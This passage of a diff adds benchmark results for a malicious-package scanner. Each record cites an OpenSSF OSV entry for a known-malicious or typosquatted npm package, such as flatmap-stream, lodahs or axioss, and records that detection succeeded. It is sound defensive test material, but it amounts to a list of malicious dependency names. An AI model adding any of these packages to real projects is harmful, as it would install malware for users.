+      "labelSource": "OpenSSF OSV MAL-2025-20690; report blob 2fdd79a99598980c7c4cbaad70833538b602a95c",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/flatmap-stream/MAL-2025-20690.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:2fdd79a99598980c7c4cbaad70833538b602a95c:faa25eec2f63ebf17e74b3d3dad492afa2bdc214",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.4,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "critical",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: flatmap-stream"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-25502",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-25502; report blob 67e0222164b6b5f6ec72ce58d7a20b430cac4dd2",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/lodahs/MAL-2025-25502.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:67e0222164b6b5f6ec72ce58d7a20b430cac4dd2:5ee45d530dcca44dea28a23994dbcdbecfc63f8e",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.4,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY",
+        "TYPOSQUAT_PACKAGE"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: lodahs"
+        },
+        {
+          "severity": "medium",
+          "confidence": "unspecified",
+          "type": "TYPOSQUAT_PACKAGE",
+          "rule": "TYPOSQUAT_PACKAGE",
+          "file": "package.json",
+          "line": null,
+          "description": "Possible typosquat of \"lodash\": lodahs"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-4275",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-4275; report blob 238dc228cd9cf54efea67c07f9bc7089b15207b4",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/axios.js/MAL-2025-4275.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:238dc228cd9cf54efea67c07f9bc7089b15207b4:e015c3138480f5286955833abfb3bea47471688d",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: axios.js"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2026-4493",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2026-4493; report blob 366383ef9f8518dfc534b911251a2dbe5ccd3928",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/axiosqqq/MAL-2026-4493.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:366383ef9f8518dfc534b911251a2dbe5ccd3928:bb3d39dbc3518a28407d264f2abcf070c3a3657b",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: axiosqqq"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-15242",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-15242; report blob 5850d1f4f2806fd59eb535b3e4d45beb058bc826",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/axioss/MAL-2025-15242.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:5850d1f4f2806fd59eb535b3e4d45beb058bc826:81363d511fb327ca5616ccfcba7c5393e1a0044c",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.4,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY",
+        "TYPOSQUAT_PACKAGE"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: axioss"
+        },
+        {
+          "severity": "medium",
+          "confidence": "unspecified",
+          "type": "TYPOSQUAT_PACKAGE",
+          "rule": "TYPOSQUAT_PACKAGE",
+          "file": "package.json",
+          "line": null,
+          "description": "Possible typosquat of \"axios\": axioss"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-15281",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-15281; report blob e6a3d9c6a3d214bff2f326a8f1d8ba8ac8c1d472",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-laoder/MAL-2025-15281.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:e6a3d9c6a3d214bff2f326a8f1d8ba8ac8c1d472:7ae13db475be04ecc7d2b6fcef3b20c40bbc2e03",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: babel-laoder"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-15282",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-15282; report blob b23f507de17d8c239290fb1c36a5d9a6d886b92c",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-loadre/MAL-2025-15282.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:b23f507de17d8c239290fb1c36a5d9a6d886b92c:cb4b464cf4c2449f6ad3903bd3e62fbe9c7579dd",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: babel-loadre"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-15283",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-15283; report blob a98eafc3406e034fe14c4e2fe25edc21ee7e9a47",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-loqder/MAL-2025-15283.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:a98eafc3406e034fe14c4e2fe25edc21ee7e9a47:b2eee8c6fb943b5b47deffd77c116865d4d2ddee",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: babel-loqder"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-15286",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-15286; report blob 7d72739e67fda4b48cc77bfcb6c868feafd17567",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-node/MAL-2025-15286.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:7d72739e67fda4b48cc77bfcb6c868feafd17567:9b2980f27303a4070b0e103b0621839940ee9724",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: babel-node"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-15289",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-15289; report blob 283dd8d75b91d4a35c89707bd10115e3d2ff9c69",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-pal/MAL-2025-15289.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:283dd8d75b91d4a35c89707bd10115e3d2ff9c69:55744bedf6294386bdc1eec2313e9b485a77322f",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: babel-pal"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-15238",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-15238; report blob aceadeea25bc4b32b766096204db12a15315e090",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/axios-http/MAL-2025-15238.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:aceadeea25bc4b32b766096204db12a15315e090:30af885d0884dd6cec7fdbfb7ba0a3248110b517",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: axios-http"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2023-116",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2023-116; report blob 0d58b457e7175cc230bff6d7b6da40d3781a5466",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/axios-proxy/MAL-2023-116.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:0d58b457e7175cc230bff6d7b6da40d3781a5466:216fcbc2c9356dbccfd103971f088bcb84682b06",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: axios-proxy"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-4813",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-4813; report blob bcd00abcd6ee4bb4083f79b6e4d10b6d289aa392",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/axios-browserify/MAL-2025-4813.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:bcd00abcd6ee4bb4083f79b6e4d10b6d289aa392:2bae461ccd66abc5ecc0082b8681a81c125302b6",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: axios-browserify"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-190832",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-190832; report blob b9b988a111a6e0915333f4b29ce75fb1fe05f293",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/axios-builder/MAL-2025-190832.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:b9b988a111a6e0915333f4b29ce75fb1fe05f293:6ac5ebe76f27904cfdec2d27badfa7ad53d6f11d",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: axios-builder"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2024-10692",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2024-10692; report blob 79cb12c286a16d2f04288db57a43bce0b197d907",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/axios-mockadptr/MAL-2024-10692.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:79cb12c286a16d2f04288db57a43bce0b197d907:4a871bf8d97a4ffd916e71d4102e1a09b3d38d6d",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: axios-mockadptr"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-191389",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-191389; report blob 6bae4d1fc6ab36b3516d10c59910f905e50c4f3a",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/axios-cancelable/MAL-2025-191389.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:6bae4d1fc6ab36b3516d10c59910f905e50c4f3a:5a611b4143b8b29595533761d56448dc59603cd8",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: axios-cancelable"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2026-2631",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2026-2631; report blob d20844f3c5e46ef0707cdad324c86ce0b027a8fa",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-plugin-blocks/MAL-2026-2631.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:d20844f3c5e46ef0707cdad324c86ce0b027a8fa:4f055c91abd296b619826fad2bb36752f7f939a7",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: babel-plugin-blocks"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-47613",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-47613; report blob 3075fa3df8d2b7a89c816127adda2b9188415350",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-ganache/MAL-2025-47613.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:3075fa3df8d2b7a89c816127adda2b9188415350:2aaacc868e3b819e0e9d4dbb9a9d58b5d83906ff",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: babel-ganache"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2026-407",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2026-407; report blob 6bbba35a96333e1960acec15928b07c83544e48a",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-js/MAL-2026-407.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:6bbba35a96333e1960acec15928b07c83544e48a:9897f3726f56deb821827c8de18501abead258f2",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: babel-js"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-15287",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-15287; report blob 910018e9ea790fae8a6c9141550913cf26e5275d",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-npm-install/MAL-2025-15287.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:910018e9ea790fae8a6c9141550913cf26e5275d:8082edb8ce35bdad9a7e5c961b346e42d7d218a3",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: babel-npm-install"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-15288",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-15288; report blob 4a51f824f7203deffb5fd237dc4105ebfbfeba03",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-npm-publish/MAL-2025-15288.json",
